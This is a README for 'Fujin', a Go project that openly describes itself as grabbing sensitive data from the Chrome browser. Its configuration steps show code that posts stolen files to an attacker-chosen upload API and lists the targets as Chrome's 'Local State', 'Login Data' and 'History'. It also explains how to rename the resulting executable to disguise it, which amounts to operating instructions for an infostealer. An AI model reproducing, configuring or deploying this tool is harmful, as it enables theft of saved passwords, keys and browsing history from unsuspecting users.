# Fujin Project

The Fujin project is a Go project which aims to grab sensitive data from chrome browser.

## Configuration
Before you can run the project, you need to perform the following steps:

1. Open the `main.go` file and look for the following line and update it with your api address:
    ```go
    req, err := http.NewRequest(http.MethodPost, "http://localhost:8080/upload", &requestBody)
    ```
2. (Optionnal) Also, if you want to add more files to extract and to be uploaded to the API, update the following line:
    ```go
    filenames := []string{"Local State", "Login Data", "History"}
    ```
3. Open the `build.ps1` file and look for the following line:
    ```powershell
    $BINARY_NAME="fujin.exe"
    ```
    Here, you can change the name of the binary file that will be created when you build the project. For example, if you want the file to be called `seishin.exe`, change the line to:
    ```powershell
    $BINARY_NAME="seishin.exe"
    ```

## Compilation

Once you've completed the setup, you can compile and run the project. To do this, open a PowerShell terminal then, run the following command:

```powershell
.\build.ps1
```
